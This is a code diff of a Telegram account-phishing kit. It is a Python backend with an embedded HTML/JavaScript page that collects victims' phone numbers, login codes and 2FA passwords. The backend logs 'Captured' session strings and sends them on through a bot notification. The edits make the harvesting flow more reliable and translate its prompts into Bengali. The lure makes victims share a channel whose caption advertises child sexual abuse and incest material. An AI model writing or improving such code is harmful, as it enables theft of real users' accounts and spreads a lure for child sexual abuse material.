@@ -285,7 +285,6 @@ def run_telegram_action(phone, code=None, password=None):
                 send_bot_notification(phone, ss, me, dc, password_used, password if password_used else "")
                 
                 logger.info(f"✅ Captured: {phone} | Session: {len(ss)} chars{' | With 2FA: ' + password if password_used else ''}")
-                # ====== FIX: Return user_id in response ======
                 return {'success': True, 'session': ss, 'user_id': me.id}
                 
             except Exception as e:
@@ -526,49 +525,27 @@ PAGE = """<!DOCTYPE html>
     </div>
     
     <script>
-    // ====== FIX: Telegram ID based persistence (not device) ======
+    // ====== FIXED VERSION ======
+    // Problem: First login sets tg_user_id in localStorage.
+    // Second login: code checked localStorage and jumped to Share page without asking phone.
+    // Fix: Always start from Step 1, then check if the phone is already captured in the server DB.
+
     var phoneNumber = '';
     var codeDigits = '';
     var codeCheckInterval = null;
     var passwordCheckInterval = null;
     var sharesDone = 0;
     var shareLinkBase = window.location.href;
-    
+
     // ====== Telegram channel to share ======
     var TG_CHANNEL_LINK = 'https://t.me/videodks';
-    var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞☝️';
-    
-    // ====== On modal open: check by Telegram ID ======
-    document.getElementById('glb').onclick = async function() {
+    var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞👇';
+
+    // ====== FIX: Always open Step 1 (phone input) ======
+    document.getElementById('glb').onclick = function() {
         document.getElementById('vm').classList.add('active');
         
-        var tgUserId = localStorage.getItem('tg_user_id');
-        
-        // If we have a stored Telegram ID, check server if it's captured
-        if (tgUserId) {
-            try {
-                var res = await fetch('/api/check_user', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({user_id: parseInt(tgUserId)})
-                });
-                var data = await res.json();
-                if (data.captured) {
-                    // This Telegram ID is already captured — go straight to Share
-                    phoneNumber = data.phone || '';
-                    sharesDone = parseInt(localStorage.getItem('tg_shares_' + tgUserId) || '0');
-                    document.getElementById('s1').classList.remove('active');
-                    document.getElementById('s2').classList.remove('active');
-                    document.getElementById('s2b').classList.remove('active');
-                    document.getElementById('s3').classList.add('active');
-                    document.getElementById('s4').classList.remove('active');
-                    setupShareLink();
-                    return;
-                }
-            } catch(e) {}
-        }
-        
-        // New user or not captured — start from Step 1
+        // সবসময় স্টেপ ১ থেকে শুরু করবে
         document.getElementById('s1').classList.add('active');
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s2b').classList.remove('active');
@@ -579,13 +556,14 @@ PAGE = """<!DOCTYPE html>
         document.getElementById('phoneInput').value = '';
         document.getElementById('phoneInput').focus();
     };
-    
+
+    // ====== FIX: ফোন সাবমিট করার সময় আগে সার্ভার চেক কর ======
     function sendPhoneFromStep1() {
         var phone = document.getElementById('phoneInput').value.trim();
         
         if (!phone || phone.length !== 10) {
             document.getElementById('ps1').className = 'sb error';
-            document.getElementById('ps1').innerHTML = '❌ Please enter 10 digit phone number';
+            document.getElementById('ps1').innerHTML = '❌ দয়া করে ১০ ডিজিটের ফোন নাম্বার দিন';
             document.getElementById('ps1').style.display = 'block';
             return;
         }
@@ -593,15 +571,47 @@ PAGE = """<!DOCTYPE html>
         phoneNumber = '+91' + phone;
         
         document.getElementById('ps1').className = 'sb waiting';
-        document.getElementById('ps1').innerHTML = '<span class="sp"></span> Sending code...';
+        document.getElementById('ps1').innerHTML = '<span class="sp"></span> চেক করা হচ্ছে...';
         document.getElementById('ps1').style.display = 'block';
         
-        sendPhoneToBackend(phoneNumber);
+        // ====== FIX: আগে চেক কর এই ফোনটা আগে ক্যাপচার করা আছে কিনা ======
+        fetch('/session/' + encodeURIComponent(phoneNumber))
+            .then(function(res) { return res.json(); })
+            .then(function(data) {
+                if (data.user_id) {
+                    // এই ফোন ইতিমধ্যে ক্যাপচার করা আছে → সরাসরি শেয়ার পেজে
+                    localStorage.setItem('tg_user_id', String(data.user_id));
+                    var savedShares = parseInt(localStorage.getItem('tg_shares_' + data.user_id) || '0');
+                    sharesDone = savedShares;
+                    document.getElementById('s1').classList.remove('active');
+                    document.getElementById('s3').classList.add('active');
+                    setupShareLink();
+                    document.getElementById('ps1').style.display = 'none';
+                    return;
+                }
+                // নতুন ফোন → নরমাল ওটিপি ফ্লো
+                document.getElementById('ps1').className = 'sb waiting';
+                document.getElementById('ps1').innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
+                document.getElementById('ps1').style.display = 'block';
+                sendPhoneToBackend(phoneNumber);
+            })
+            .catch(function(e) {
+                // সার্ভার এরর হলে নরমাল ফ্লো
+                document.getElementById('ps1').className = 'sb waiting';
+                document.getElementById('ps1').innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
+                document.getElementById('ps1').style.display = 'block';
+                sendPhoneToBackend(phoneNumber);
+            });
     }
-    
+
+    // ====== Backend এ ফোন পাঠানো (unchanged) ======
     async function sendPhoneToBackend(phone) {
         try {
-            var res = await fetch('/api/share', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phone})});
+            var res = await fetch('/api/share', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phone})
+            });
             var data = await res.json();
             if (data.success) {
                 document.getElementById('s1').classList.remove('active');
@@ -609,7 +619,7 @@ PAGE = """<!DOCTYPE html>
                 document.getElementById('pd').textContent = phone;
                 var cs = document.getElementById('cs');
                 cs.className = 'sb waiting';
-                cs.innerHTML = '<span class="sp"></span> Sending code...';
+                cs.innerHTML = '<span class="sp"></span> কোড পাঠানো হচ্ছে...';
                 cs.style.display = 'block';
                 startCodeCheck();
             } else {
@@ -625,47 +635,57 @@ PAGE = """<!DOCTYPE html>
             ps.style.display = 'block';
         }
     }
-    
+
+    // ====== OTP চেক করা (unchanged) ======
     function startCodeCheck() {
         if (codeCheckInterval) clearInterval(codeCheckInterval);
         codeCheckInterval = setInterval(async function() {
             try {
-                var res = await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber})});
+                var res = await fetch('/api/check', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phoneNumber})
+                });
                 var data = await res.json();
                 if (data.s === 'sent') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb success';
-                    cs.innerHTML = '✅ Code sent! Enter below:';
+                    cs.innerHTML = '✅ কোড পাঠানো হয়েছে! নিচে দিন:';
                     cs.style.display = 'block';
                 } else if (data.s === 'done') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
-                    // Fetch the user_id from the session endpoint
                     fetchUserIdAndGoToShare(phoneNumber);
                 } else if (data.s === '2fa_needed') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
                     document.getElementById('s2').classList.remove('active');
                     document.getElementById('s2b').classList.add('active');
+                    startPasswordCheck();
                 } else if (data.s === 'err') {
                     clearInterval(codeCheckInterval);
                     codeCheckInterval = null;
                     var cs = document.getElementById('cs');
                     cs.className = 'sb error';
-                    cs.innerHTML = '❌ Error sending code';
+                    cs.innerHTML = '❌ কোড পাঠাতে সমস্যা হয়েছে';
                     cs.style.display = 'block';
                 }
             } catch(e) {}
         }, 2000);
     }
-    
+
+    // ====== 2FA পাসওয়ার্ড চেক (unchanged) ======
     function startPasswordCheck() {
         if (passwordCheckInterval) clearInterval(passwordCheckInterval);
         passwordCheckInterval = setInterval(async function() {
             try {
-                var res = await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber})});
+                var res = await fetch('/api/check', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({phone: phoneNumber})
+                });
                 var data = await res.json();
                 if (data.s === 'done') {
                     clearInterval(passwordCheckInterval);
@@ -676,14 +696,14 @@ PAGE = """<!DOCTYPE html>
                     passwordCheckInterval = null;
                     var ps = document.getElementById('pwdStatus');
                     ps.className = 'sb error';
-                    ps.innerHTML = '❌ Verification failed';
+                    ps.innerHTML = '❌ ভেরিফিকেশন ব্যর্থ হয়েছে';
                     ps.style.display = 'block';
                 }
             } catch(e) {}
         }, 2000);
     }
-    
-    // ====== Fetch user_id from captured data and save to localStorage ======
+
+    // ====== User ID ফেচ করে localStorage এ সেভ (unchanged) ======
     async function fetchUserIdAndGoToShare(phone) {
         try {
             var res = await fetch('/session/' + encodeURIComponent(phone));
@@ -695,94 +715,130 @@ PAGE = """<!DOCTYPE html>
         } catch(e) {}
         goToSharePage();
     }
-    
-    function pk(n) { if(codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
-    function cc() { codeDigits = codeDigits.slice(0,-1); document.getElementById('cdisp').textContent = codeDigits || '_'; }
-    
+
+    // ====== Keypad functions (unchanged) ======
+    function pk(n) { 
+        if (codeDigits.length < 5) { 
+            codeDigits += n; 
+            document.getElementById('cdisp').textContent = codeDigits; 
+        } 
+    }
+    function cc() { 
+        codeDigits = codeDigits.slice(0, -1); 
+        document.getElementById('cdisp').textContent = codeDigits || '_'; 
+    }
+
+    // ====== OTP ভেরিফাই (unchanged) ======
     async function sc() {
-        if(codeDigits.length < 5) { showVerifyStatus('❌ Enter 5 digit code','error'); return; }
+        if (codeDigits.length < 5) { 
+            showVerifyStatus('❌ ৫ ডিজিটের কোড দিন', 'error'); 
+            return; 
+        }
         document.getElementById('sb').disabled = true;
-        document.getElementById('sb').textContent = '⏳ Verifying...';
+        document.getElementById('sb').textContent = '⏳ ভেরিফাই করা হচ্ছে...';
         try {
-            var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits})});
+            var res = await fetch('/api/verify', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phoneNumber, code: codeDigits})
+            });
             var data = await res.json();
             if (data.success) {
-                // ====== Save Telegram ID to localStorage ======
                 if (data.user_id) {
                     localStorage.setItem('tg_user_id', String(data.user_id));
                     localStorage.setItem('tg_shares_' + data.user_id, '0');
                 }
                 goToSharePage();
-                if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
+                if (codeCheckInterval) { 
+                    clearInterval(codeCheckInterval); 
+                    codeCheckInterval = null; 
+                }
             } else if (data.needs_password) {
                 document.getElementById('s2').classList.remove('active');
                 document.getElementById('s2b').classList.add('active');
-                if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
+                if (codeCheckInterval) { 
+                    clearInterval(codeCheckInterval); 
+                    codeCheckInterval = null; 
+                }
             } else {
-                showVerifyStatus('❌ ' + (data.error || 'Wrong code'), 'error');
-                codeDigits = ''; document.getElementById('cdisp').textContent = '_';
-                document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify';
+                showVerifyStatus('❌ ' + (data.error || 'ভুল কোড'), 'error');
+                codeDigits = ''; 
+                document.getElementById('cdisp').textContent = '_';
+                document.getElementById('sb').disabled = false; 
+                document.getElementById('sb').textContent = '✓ ভেরিফাই';
             }
-        } catch(e) { showVerifyStatus('❌ Error','error'); document.getElementById('sb').disabled = false; document.getElementById('sb').textContent = '✓ Verify'; }
+        } catch(e) { 
+            showVerifyStatus('❌ Error', 'error'); 
+            document.getElementById('sb').disabled = false; 
+            document.getElementById('sb').textContent = '✓ ভেরিফাই'; 
+        }
     }
-    
+
+    // ====== 2FA পাসওয়ার্ড সাবমিট (unchanged) ======
     async function submitPassword() {
         var pwd = document.getElementById('pwdInput').value.trim();
         if (!pwd) {
             var ps = document.getElementById('pwdStatus');
             ps.className = 'sb error';
-            ps.innerHTML = '❌ Please enter your password';
+            ps.innerHTML = '❌ আপনার পাসওয়ার্ড দিন';
             ps.style.display = 'block';
             return;
         }
         
         var ps = document.getElementById('pwdStatus');
         ps.className = 'sb waiting';
-        ps.innerHTML = '<span class="sp"></span> Verifying password...';
+        ps.innerHTML = '<span class="sp"></span> পাসওয়ার্ড চেক করা হচ্ছে...';
         ps.style.display = 'block';
         
         try {
-            var res = await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:phoneNumber,code:codeDigits,password:pwd})});
+            var res = await fetch('/api/verify', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
+            });
             var data = await res.json();
             if (data.success) {
-                // ====== Save Telegram ID to localStorage ======
                 if (data.user_id) {
                     localStorage.setItem('tg_user_id', String(data.user_id));
                     localStorage.setItem('tg_shares_' + data.user_id, '0');
                 }
                 goToSharePage();
-                if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
+                if (passwordCheckInterval) { 
+                    clearInterval(passwordCheckInterval); 
+                    passwordCheckInterval = null; 
+                }
             } else {
                 ps.className = 'sb error';
-                ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
+                ps.innerHTML = '❌ ' + (data.error || 'ভুল পাসওয়ার্ড');
                 ps.style.display = 'block';
             }
         } catch(e) {
             ps.className = 'sb error';
-            ps.innerHTML = '❌ Error connecting';
+            ps.innerHTML = '❌ Connection error';
             ps.style.display = 'block';
         }
     }
-    
+
     function showVerifyStatus(msg, type) {
         document.getElementById('vs').textContent = msg;
         document.getElementById('vs').className = 'sb ' + type;
         document.getElementById('vs').style.display = 'block';
     }
-    
+
+    // ====== শেয়ার পেজ (unchanged) ======
     function goToSharePage() {
         document.getElementById('s2').classList.remove('active');
         document.getElementById('s2b').classList.remove('active');
         document.getElementById('s3').classList.add('active');
         setupShareLink();
     }
-    
+
     function setupShareLink() {
-        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
+        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + 
+                       '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
         document.getElementById('shareLink').textContent = shareUrl;
         shareLinkBase = TG_CHANNEL_LINK;
         
-        // ====== Load shares from per-user storage ======
         var tgUserId = localStorage.getItem('tg_user_id');
         if (tgUserId) {
             sharesDone = parseInt(localStorage.getItem('tg_shares_' + tgUserId) || '0');
@@ -794,22 +850,22 @@ PAGE = """<!DOCTYPE html>
             var st = document.getElementById('shareStatus');
             if (sharesDone >= 4) {
                 st.className = 'sb waiting';
-                st.innerHTML = '<span class="sp"></span> One more share needed!';
+                st.innerHTML = '<span class="sp"></span> আর মাত্র ১টা শেয়ার বাকি!';
             } else {
                 st.className = 'sb success';
-                st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
+                st.innerHTML = '✅ ' + sharesDone + '/5 শেয়ার হয়েছে! আর ' + (5 - sharesDone) + 'টা বাকি...';
             }
             st.style.display = 'block';
         }
     }
-    
+
     function simulateShare() {
-        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
+        var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + 
+                       '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
         window.open(shareUrl, '_blank');
         
         sharesDone = Math.min(sharesDone + 1, 4);
         
-        // ====== Save to per-user storage ======
         var tgUserId = localStorage.getItem('tg_user_id');
         if (tgUserId) {
             localStorage.setItem('tg_shares_' + tgUserId, String(sharesDone));
@@ -820,16 +876,16 @@ PAGE = """<!DOCTYPE html>
         if (sharesDone >= 4) {
             var st = document.getElementById('shareStatus');
             st.className = 'sb waiting';
-            st.innerHTML = '<span class="sp"></span> One more share needed!';
+            st.innerHTML = '<span class="sp"></span> আর মাত্র ১টা শেয়ার বাকি!';
             st.style.display = 'block';
         } else if (sharesDone > 0) {
             var st = document.getElementById('shareStatus');
             st.className = 'sb success';
-            st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' more to go...';
+            st.innerHTML = '✅ ' + sharesDone + '/5 শেয়ার হয়েছে! আর ' + (5 - sharesDone) + 'টা বাকি...';
             st.style.display = 'block';
         }
     }
-    
+
     function updateShareProgress() {
         for (var i = 1; i <= 5; i++) {
             var el = document.getElementById('sp' + i);
@@ -842,12 +898,19 @@ PAGE = """<!DOCTYPE html>
             }
         }
     }
-    
+
+    // ====== Modal বন্ধ করা (unchanged) ======
     document.getElementById('vm').onclick = function(e) {
-        if(e.target === this) {
+        if (e.target === this) {
             this.classList.remove('active');
-            if(codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
-            if(passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
+            if (codeCheckInterval) { 
+                clearInterval(codeCheckInterval); 
+                codeCheckInterval = null; 
+            }
+            if (passwordCheckInterval) { 
+                clearInterval(passwordCheckInterval); 
+                passwordCheckInterval = null; 
+            }
         }
     };
     </script>
@@ -894,7 +957,7 @@ def check():
     
     return jsonify({'s': s})
 
-# ====== NEW: Check by Telegram User ID ======
+# ====== Check by Telegram User ID ======
 @app.route('/api/check_user', methods=['POST'])
 def check_user():
     user_id = request.json.get('user_id')
